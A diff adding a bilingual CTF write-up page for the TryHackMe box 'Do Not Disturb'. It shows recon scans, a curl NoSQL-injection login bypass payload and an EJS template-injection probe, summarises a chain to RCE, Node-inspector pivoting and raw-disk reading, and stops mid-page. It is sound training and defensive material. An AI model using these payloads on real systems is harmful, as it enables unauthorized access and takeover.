@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo" data-en="Do Not Disturb: NoSQL, SSTI &amp; Node inspector — NonèCostanzo">Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express." data-en="Writeup TryHackMe Do Not Disturb: NoSQL injection login bypass, EJS SSTI, RCE and privesc via Node --inspect and the disk group. Node/Express box." content="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo" data-en="Do Not Disturb: NoSQL, SSTI &amp; Node inspector — NonèCostanzo" content="Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express." data-en="Writeup TryHackMe Do Not Disturb: NoSQL injection login bypass, EJS SSTI, RCE and privesc via Node --inspect and the disk group. Node/Express box." content="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="Do Not Disturb — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-08-02T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-08-02T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo" data-en="Do Not Disturb: NoSQL, SSTI &amp; Node inspector — NonèCostanzo" content="Do Not Disturb: NoSQL, SSTI e Node inspector — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express." data-en="Writeup TryHackMe Do Not Disturb: NoSQL injection login bypass, EJS SSTI, RCE and privesc via Node --inspect and the disk group. Node/Express box." content="Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"Do Not Disturb: NoSQL, SSTI e Node inspector",
+  "description":"Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/og.png"],"datePublished":"2026-08-02T09:00:00+02:00","dateModified":"2026-08-02T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, Do Not Disturb, Boot2root, TryHackMe, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — Do Not Disturb"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"Do Not Disturb","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">Do Not Disturb</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Boot2root</span><span class="tag">TryHackMe</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-08-02" data-it="02 Ago 2026" data-en="02 Aug 2026">02 Ago 2026</time>
+      <span class="meta-item" data-it="7 min di lettura" data-en="7 min read">7 min di lettura</span>
+      <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
+      <span class="meme-tag" data-it="// il cartello «Do Not Disturb» non copre la porta 9229" data-en="// the 'Do Not Disturb' sign doesn't cover port 9229">// il cartello «Do Not Disturb» non copre la porta 9229</span>
+    </div>
+    <h1 data-it="Do Not Disturb: dal bordo piscina a root, un anello alla volta" data-en="Do Not Disturb: from poolside to root, one link at a time">Do Not Disturb: dal bordo piscina a root, un anello alla volta</h1>
+    <p class="article-intro" data-it="Byte Lotus è una piattaforma di booking per cabana e lettini a bordo piscina, e a quanto pare qualcuno ci sta già giocando: wallet che cambiano da soli, sessioni dirottate. Ci sono entrato anch'io, ma con metodo: una login che si fidava troppo del JSON, una feature «staff» che si fidava ancora di più, e un debugger Node lasciato in ascolto. Nessuno di questi bug è «critico» da solo; il problema, come sempre, è la catena." data-en="Byte Lotus is a booking platform for poolside cabanas and sunbeds, and someone was clearly already playing with it: wallets changing on their own, hijacked sessions. I got in too, but methodically: a login that trusted JSON too much, a &quot;staff&quot; feature that trusted it even more, and a Node debugger left listening. None of these bugs is &quot;critical&quot; on its own; the problem, as always, is the chain.">Byte Lotus è una piattaforma di booking per cabana e lettini a bordo piscina, e a quanto pare qualcuno ci sta già giocando: wallet che cambiano da soli, sessioni dirottate. Ci sono entrato anch'io, ma con metodo: una login che si fidava troppo del JSON, una feature «staff» che si fidava ancora di più, e un debugger Node lasciato in ascolto. Nessuno di questi bug è «critico» da solo; il problema, come sempre, è la catena.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="Bypass login con &lt;strong&gt;NoSQL injection&lt;/strong&gt;: &lt;code&gt;{&quot;$ne&quot;:&quot;&quot;}&lt;/code&gt; nel body JSON di Express." data-en="Login bypass via &lt;strong&gt;NoSQL injection&lt;/strong&gt;: &lt;code&gt;{&quot;$ne&quot;:&quot;&quot;}&lt;/code&gt; in Express's JSON body.">Bypass login con <strong>NoSQL injection</strong>: <code>{"$ne":""}</code> nel body JSON di Express.</li><li data-it="&lt;strong&gt;SSTI&lt;/strong&gt; in EJS su &lt;code&gt;/staff/preview&lt;/code&gt;: &lt;code&gt;&amp;lt;%= 7*7 %&amp;gt;&lt;/code&gt; restituisce &lt;code&gt;49&lt;/code&gt;." data-en="&lt;strong&gt;SSTI&lt;/strong&gt; in EJS on &lt;code&gt;/staff/preview&lt;/code&gt;: &lt;code&gt;&amp;lt;%= 7*7 %&amp;gt;&lt;/code&gt; returns &lt;code&gt;49&lt;/code&gt;."><strong>SSTI</strong> in EJS su <code>/staff/preview</code>: <code>&lt;%= 7*7 %&gt;</code> restituisce <code>49</code>.</li><li data-it="RCE aggirando &lt;code&gt;require&lt;/code&gt; via &lt;code&gt;global.process.mainModule.require&lt;/code&gt;." data-en="RCE bypassing &lt;code&gt;require&lt;/code&gt; via &lt;code&gt;global.process.mainModule.require&lt;/code&gt;.">RCE aggirando <code>require</code> via <code>global.process.mainModule.require</code>.</li><li data-it="Privesc: pivot su &lt;code&gt;pipelinesvc&lt;/code&gt; attraverso &lt;code&gt;node --inspect&lt;/code&gt; (CDP su &lt;code&gt;:9229&lt;/code&gt;)." data-en="Privesc: pivot to &lt;code&gt;pipelinesvc&lt;/code&gt; through &lt;code&gt;node --inspect&lt;/code&gt; (CDP on &lt;code&gt;:9229&lt;/code&gt;).">Privesc: pivot su <code>pipelinesvc</code> attraverso <code>node --inspect</code> (CDP su <code>:9229</code>).</li><li data-it="Root flag dal disco grezzo: gruppo &lt;code&gt;disk&lt;/code&gt; + &lt;code&gt;debugfs&lt;/code&gt;, senza &lt;code&gt;uid=0&lt;/code&gt;." data-en="Root flag from the raw disk: &lt;code&gt;disk&lt;/code&gt; group + &lt;code&gt;debugfs&lt;/code&gt;, no &lt;code&gt;uid=0&lt;/code&gt;.">Root flag dal disco grezzo: gruppo <code>disk</code> + <code>debugfs</code>, senza <code>uid=0</code>.</li></ul>
+    </div>
+
+    <h2 data-it="[01] Recon: due porte e un 403 parlante" data-en="[01] Recon: two ports and a talkative 403" id='recon'>[01] Recon: due porte e un 403 parlante</h2>
+    <p data-it="Due porte, zero sorprese. Per ora. Un &lt;code&gt;nmap&lt;/code&gt; completo trova solo SSH e un'app Node.js/Express su HTTP: «Byte Lotus — Poolside»." data-en="Two ports, no surprises. For now. A full &lt;code&gt;nmap&lt;/code&gt; finds only SSH and a Node.js/Express app over HTTP: &quot;Byte Lotus — Poolside&quot;.">Due porte, zero sorprese. Per ora. Un <code>nmap</code> completo trova solo SSH e un'app Node.js/Express su HTTP: «Byte Lotus — Poolside».</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">nmap -sC -sV -p- -T4 &lt;target&gt;</span>
+<span class="comment"># 22/tcp  open  ssh</span>
+<span class="comment"># 80/tcp  open  http   Node.js (Express) — "Byte Lotus — Poolside"</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">nmap -sC -sV -p- -T4 &lt;target&gt;</span>
+<span class="comment"># 22/tcp  open  ssh</span>
+<span class="comment"># 80/tcp  open  http   Node.js (Express) — "Byte Lotus — Poolside"</span></pre>
+</div></div>
+    <p data-it="Fuzzo i path. Non cerco file segreti: cerco la superficie, cosa esiste e cosa è protetto." data-en="I fuzz for paths. I'm not after secret files: I'm mapping the surface, what exists and what's protected.">Fuzzo i path. Non cerco file segreti: cerco la superficie, cosa esiste e cosa è protetto.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">ffuf -u http://&lt;target&gt;/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50</span>
+<span class="comment"># /login    200</span>
+<span class="comment"># /logout   302</span>
+# /staff    <span class="warn">403</span>   # esiste, ma non mi fanno entrare</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">ffuf -u http://&lt;target&gt;/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50</span>
+<span class="comment"># /login    200</span>
+<span class="comment"># /logout   302</span>
+# /staff    <span class="warn">403</span>   # it exists, but I'm not allowed in</pre>
+</div></div>
+    <p data-it="Quel &lt;code&gt;403&lt;/code&gt; su &lt;code&gt;/staff&lt;/code&gt; è un cartello, non un muro: la pagina esiste, quindi da qualche parte c'è un cancello di autenticazione da forzare. Il login diventa il bersaglio." data-en="That &lt;code&gt;403&lt;/code&gt; on &lt;code&gt;/staff&lt;/code&gt; is a signpost, not a wall: the page exists, so somewhere there's an auth gate to get past. The login becomes the target.">Quel <code>403</code> su <code>/staff</code> è un cartello, non un muro: la pagina esiste, quindi da qualche parte c'è un cancello di autenticazione da forzare. Il login diventa il bersaglio.</p>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="Un &lt;code&gt;403&lt;/code&gt; invece di un &lt;code&gt;404&lt;/code&gt; conferma l'esistenza della risorsa: l'enumerazione impara più dai codici di stato che dai contenuti." data-en="A &lt;code&gt;403&lt;/code&gt; instead of a &lt;code&gt;404&lt;/code&gt; confirms the resource exists: enumeration learns more from status codes than from page content.">Un <code>403</code> invece di un <code>404</code> conferma l'esistenza della risorsa: l'enumerazione impara più dai codici di stato che dai contenuti.</p>
+</div>
+
+    <h2 data-it="[02] Login bypass con NoSQL injection" data-en="[02] Login bypass via NoSQL injection" id='nosql'>[02] Login bypass con NoSQL injection</h2>
+    <p data-it="La login accetta JSON, è Express. Invece di indovinare credenziali cambio la &lt;em&gt;forma&lt;/em&gt; dell'input: al posto di stringhe passo operatori di query MongoDB." data-en="The login accepts JSON, it's Express. Instead of guessing credentials I change the &lt;em&gt;shape&lt;/em&gt; of the input: instead of strings I pass MongoDB query operators.">La login accetta JSON, è Express. Invece di indovinare credenziali cambio la <em>forma</em> dell'input: al posto di stringhe passo operatori di query MongoDB.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s -i -X POST http://&lt;target&gt;/login \</span>
+<span class="neutral">  -H "Content-Type: application/json" \</span>
+<span class="neutral">  -d '{"username":{"$ne":""},"password":{"$ne":""}}'</span>
+<span class="comment"># HTTP/1.1 302 Found</span>
+# Set-Cookie: <span class="ok">connect.sid=s%3A...</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s -i -X POST http://&lt;target&gt;/login \</span>
+<span class="neutral">  -H "Content-Type: application/json" \</span>
+<span class="neutral">  -d '{"username":{"$ne":""},"password":{"$ne":""}}'</span>
+<span class="comment"># HTTP/1.1 302 Found</span>
+# Set-Cookie: <span class="ok">connect.sid=s%3A...</span></pre>
+</div></div>
+    <p data-it="&lt;code&gt;$ne&lt;/code&gt; vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale." data-en="&lt;code&gt;$ne&lt;/code&gt; means &quot;not equal&quot;. The query becomes &quot;find me a user whose username isn't empty and whose password isn't empty&quot;: that's everyone. The server hands me a valid session without my knowing a single credential."><code>$ne</code> vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale.</p>
+    <p data-it="Perché funziona? &lt;code&gt;express.json()&lt;/code&gt; deserializza &lt;em&gt;oggetti annidati&lt;/em&gt;, e il codice passa quell'oggetto dritto nel filtro, tipo &lt;code&gt;User.findOne({ username, password })&lt;/code&gt;. Se &lt;code&gt;password&lt;/code&gt; è la stringa attesa è un confronto; se è un oggetto &lt;code&gt;$ne&lt;/code&gt; diventa un operatore. La difesa non è «vietare $ne», è &lt;strong&gt;tipizzare&lt;/strong&gt;: forzare &lt;code&gt;String(...)&lt;/code&gt; o passare da &lt;code&gt;mongo-sanitize&lt;/code&gt; prima che l'input tocchi il DB." data-en="Why does it work? &lt;code&gt;express.json()&lt;/code&gt; deserializes &lt;em&gt;nested objects&lt;/em&gt;, and the code passes that object straight into the filter, something like &lt;code&gt;User.findOne({ username, password })&lt;/code&gt;. If &lt;code&gt;password&lt;/code&gt; is the expected string it's a comparison; if it's a &lt;code&gt;$ne&lt;/code&gt; object it becomes an operator. The fix isn't &quot;ban $ne&quot;, it's to &lt;strong&gt;coerce types&lt;/strong&gt;: force &lt;code&gt;String(...)&lt;/code&gt; or run &lt;code&gt;mongo-sanitize&lt;/code&gt; before the input touches the DB.">Perché funziona? <code>express.json()</code> deserializza <em>oggetti annidati</em>, e il codice passa quell'oggetto dritto nel filtro, tipo <code>User.findOne({ username, password })</code>. Se <code>password</code> è la stringa attesa è un confronto; se è un oggetto <code>$ne</code> diventa un operatore. La difesa non è «vietare $ne», è <strong>tipizzare</strong>: forzare <code>String(...)</code> o passare da <code>mongo-sanitize</code> prima che l'input tocchi il DB.</p>
+    <div class="callout-red">
+  <div class="callout-label" data-it="// antipattern" data-en="// antipattern">// antipattern</div>
+  <p data-it="Fidarsi della forma del JSON. Un body come &lt;code&gt;{&quot;$gt&quot;:&quot;&quot;}&lt;/code&gt; è indistinguibile da una stringa finché non lo tipizzi tu." data-en="Trusting the shape of the JSON. A body like &lt;code&gt;{&quot;$gt&quot;:&quot;&quot;}&lt;/code&gt; is indistinguishable from a string until you coerce it yourself.">Fidarsi della forma del JSON. Un body come <code>{"$gt":""}</code> è indistinguibile da una stringa finché non lo tipizzi tu.</p>
+</div>
+
+    <h2 data-it="[03] SSTI in EJS: da template a shell" data-en="[03] EJS SSTI: from template to shell" id='ssti'>[03] SSTI in EJS: da template a shell</h2>
+    <p data-it="Con il cookie &lt;code&gt;/staff&lt;/code&gt; si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Testo subito l'ovvio." data-en="With the cookie, &lt;code&gt;/staff&lt;/code&gt; opens: it's the &quot;Cabana Desk&quot; console, with a form to customise the booking-confirmation message. The message is an EJS template, and it lets me write it. I test the obvious first.">Con il cookie <code>/staff</code> si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Testo subito l'ovvio.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
+<span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
+<span class="neutral">  --data-urlencode 'template=&lt;%= 7*7 %&gt;'</span>
+<span class="comment"># 49    &lt;- il server calcola, non stampa</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
